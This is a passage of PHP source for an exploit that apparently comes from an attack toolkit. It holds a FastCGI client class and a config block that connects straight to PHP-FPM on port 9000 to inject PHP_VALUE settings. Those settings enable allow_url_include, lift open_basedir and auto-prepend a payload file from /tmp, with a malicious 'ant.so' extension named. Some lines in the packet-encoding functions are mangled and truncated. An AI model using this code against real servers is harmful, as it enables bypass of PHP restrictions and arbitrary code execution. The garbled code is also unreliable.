         */
        private $_host = null;
        /**
         * Port
         * @var Integer
         */
        private $_port = null;
        /**
         * Keep Alive
         * @var Boolean
         */
        private $_keepAlive = false;
        /**
         * Constructor
         *
         * @param String $host Host of the FastCGI application
         * @param Integer $port Port of the FastCGI application
         */
        public function __construct($host, $port = 9000) // and default value for port, just for unixdomain socket
        {
            $this->_host = $host;
            $this->_port = $port;
        }
        /**
         * Define whether or not the FastCGI application should keep the connection
         * alive at the end of a request
         *
         * @param Boolean $b true if the connection should stay alive, false otherwise
         */
        public function setKeepAlive($b)
        {
            $this->_keepAlive = (boolean)$b;
            if (!$this->_keepAlive && $this->_sock) {
                fclose($this->_sock);
            }
        }
        /**
         * Get the keep alive status
         *
         * @return Boolean true if the connection should stay alive, false otherwise
         */
        public function getKeepAlive()
        {
            return $this->_keepAlive;
        }
        /**
         * Create a connection to the FastCGI application
         */
        private function connect()
        {
            if (!$this->_sock) {
                $this->_sock = fsockopen($this->_host, $this->_port, $errno, $errstr, 5);
                if (!$this->_sock) {
                    throw new Exception('Unable to connect to FastCGI application');
                }
            }
        }
        /**
         * Build a FastCGI packet
         *
         * @param Integer $type Type of the packet
         * @param String $content Content of the packet
         * @param Integer $requestId RequestId
         */
        private function buildPacket($type, $content, $requestId = 1)
        {
            $clen = strlen($content);
            return chr(self::VERSION_1)         /* version */
                . chr($type)                    /* type */
                . chr(($requestId >> 8) & 0xFF) /* requestIdB1 */
                . chr($requestId & 0xFF)        /* requestIdB0 */
                . chr(($clen >> 8 ) & 0xFF)     /* contentLengthB1 */
                . chr($clen & 0xFF)             /* contentLengthB0 */
                . chr(0)                        /* paddingLength */
                . chr(0)                        /* reserved */
                . $content;                     /* content */
        }
        /**
         * Build an FastCGI Name value pair
         *
         * @param String $name Name
         * @param String $value Value
         * @return String FastCGI Name value pair
         */
        private function buildNvpair($name, $value)
        {
            $nlen = strlen($name);
            $vlen = strlen($value);
            if ($nlen > 24) | 0x80) . chr(($nlen >> 16) & 0xFF) . chr(($nlen >> 8) & 0xFF) . chr($nlen & 0xFF);
            }
            if ($vlen > 24) | 0x80) . chr(($vlen >> 16) & 0xFF) . chr(($vlen >> 8) & 0xFF) . chr($vlen & 0xFF);
            }
            /* nameData & valueData */
            return $nvpair . $name . $value;
        }
        /**
         * Decode a FastCGI Packet
         *
         * @param String $data String containing all the packet
         * @return array
         */
        private function decodePacketHeader($data)
        {
            $ret = array();
            $ret['version']       = ord($data{0});
            $ret['type']          = ord($data{1});
            $ret['requestId']     = (ord($data{2}) _sock, self::HEADER_LEN)) {
                $resp = $this->decodePacketHeader($packet);
                $resp['content'] = '';
                if ($resp['contentLength']) {
                    $len  = $resp['contentLength'];
                    while ($len && $buf=fread($this->_sock, $len)) {
                        $len -= strlen($buf);
                        $resp['content'] .= $buf;
                    }
                }
                if ($resp['paddingLength']) {
                    $buf=fread($this->_sock, $resp['paddingLength']);
                }
                return $resp;
            } else {
                return false;
            }
        }
        /**
         * Execute a request to the FastCGI application
         *
         * @param array $params Array of parameters
         * @param String $stdin Content
         * @return String
         */
        public function request(array $params, $stdin)
        {
            $response = '';
            $this->connect();
            $request = $this->buildPacket(self::BEGIN_REQUEST, chr(0) . chr(self::RESPONDER) . chr((int) $this->_keepAlive) . str_repeat(chr(0), 5));
            $paramsRequest = '';
            foreach ($params as $key => $value) {
                $paramsRequest .= $this->buildNvpair($key, $value);
            }
            if ($paramsRequest) {
                $request .= $this->buildPacket(self::PARAMS, $paramsRequest);
            }
            $request .= $this->buildPacket(self::PARAMS, '');
            if ($stdin) {
                $request .= $this->buildPacket(self::STDIN, $stdin);
            }
            $request .= $this->buildPacket(self::STDIN, '');
            fwrite($this->_sock, $request);
            do {
                $resp = $this->readPacket();
                if ($resp['type'] == self::STDOUT || $resp['type'] == self::STDERR) {
                    $response .= $resp['content'];
                }
            } while ($resp && $resp['type'] != self::END_REQUEST);
            if (!is_array($resp)) {
                throw new Exception('Bad request');
            }
            switch (ord($resp['content']{4})) {
                case self::CANT_MPX_CONN:
                    throw new Exception('This app can't multiplex [CANT_MPX_CONN]');
                    break;
                case self::OVERLOADED:
                    throw new Exception('New request rejected; too busy [OVERLOADED]');
                    break;
                case self::UNKNOWN_ROLE:
                    throw new Exception('Role value not known [UNKNOWN_ROLE]');
                    break;
                case self::REQUEST_COMPLETE:
                    return $response;
            }
        }
    }
    ?>
    <?php
    /************ config ************/
    // your extension directory path
    $ext_dir_path = '/tmp/';
    // your extension name
    $ext_name = 'ant.so';
    // unix socket path or tcp host
    $connect_path = '127.0.0.1';
    // tcp connection port (unix socket: -1)
    $port = "9000";
    // Don't use this exploit file itself
    $filepath = '/var/www/html/index.php';
    // your php payload location
    $prepend_file_path = '/tmp/1.txt';
    /********************************/
    $req = '/' . basename($filepath);
    $uri = $req;
    $client = new FCGIClient($connect_path, $port);
    // disable open_basedir and open allow_url_include
    $php_value = "allow_url_include = Onnopen_basedir = /nauto_prepend_file = " . $prepend_file_path;